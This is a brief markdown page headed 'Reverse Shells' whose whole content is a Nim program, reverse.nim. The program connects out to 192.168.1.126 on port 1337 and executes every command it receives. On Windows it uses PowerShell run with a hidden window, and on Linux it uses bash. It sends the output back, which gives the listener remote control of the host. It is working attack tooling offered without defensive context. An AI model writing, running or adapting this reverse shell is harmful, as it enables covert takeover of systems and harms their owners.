# Reverse Shells

reverse.nim

```
import net
import osproc
import strformat

# Create Socket
let port = 1337
let address = "192.168.1.126"
let sock = newSocket()

# Connect to listener
sock.connect(address, Port(port))


when defined windows:
  #Create Prompt
  let prompt = "N1M_Sh3ll_4_Windows> "
  while true:
      # Send prompt
      send(sock, prompt)

      # Receive Data
      # Run command
      let cmd = recvLine(sock)
      let output = 
          execProcess(fmt"powershell.exe -nop -w hidden -c {cmd}")
      send(sock, output)
else:
  #Create Prompt
  let prompt = "N1M_Sh3ll_4_Linux> "
  while true:
      # Send prompt
      send(sock, prompt)

      # Receive Data
      # Run command
      let cmd = recvLine(sock)
      let output = 
          execProcess(fmt"/bin/bash -c '{cmd}'")
      send(sock, output)
```
